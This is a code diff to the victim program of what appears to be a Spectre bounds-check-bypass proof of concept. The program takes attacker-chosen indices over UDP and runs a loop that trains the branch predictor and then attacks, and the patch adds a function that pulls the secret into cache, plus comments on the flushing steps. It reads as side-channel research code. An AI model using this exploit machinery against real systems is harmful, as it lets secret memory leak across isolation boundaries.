@@ -33,7 +33,7 @@
 #include <unistd.h>
 
 // Local Includes:
-#include "udp-socket.h"
+#include "udp_socket.h"
 #include "defines.h"
 
 /********************************************************************
@@ -43,7 +43,7 @@ Victim constants.
 
 
 /********************************************************************
-Victim globals.
+Victim private globals.
 ********************************************************************/
 unsigned int array1_size = 16;
 uint8_t unused1[64];
@@ -203,12 +203,18 @@ inline void flush_condition() {
 }
 
 
+inline bool touch_secret(size_t i = 0) {
+  return (secret[i] == secret_heap[i]);
+}
+
+
 void helper(size_t malicious_x, size_t training_x = 0) {
-  flush_array2();
+  flush_array2(); // ensures side-channel is uncached (optional?)
+  volatile bool equal = touch_secret(); // ensures secret is cached (optional?)
 
   /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
   for (int j = 29; j >= 0; j--) {
-    flush_condition();
+    flush_condition();  // ensures speculation occurs (optional?)
 
     /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
     /* Avoid jumps in case those tip off the branch predictor */
@@ -241,8 +247,10 @@ void recv_worker(uint16_t port = 7777) {
       auto x = m->x;
       m->x = tries;
 
+#ifdef DEBUG
       std::cout << "["<<port<<"]- Received msg of " << bytes << " bytes.\n";
       std::cout << "x=" << x << std::endl;
+#endif
 
       size_t training_x = (tries++ * 13) % ARRAY1_LEN;
       size_t malicious_x = x;
@@ -250,7 +258,7 @@ void recv_worker(uint16_t port = 7777) {
       s.send(m, sizeof(*m));
     }
     else {
-      std::cout << "["<<port<<"]- Received an unexpected" << bytes << "...\n";
+      std::cerr << "["<<port<<"]- Received an unexpected" << bytes << "...\n";
       return;
     }
   }
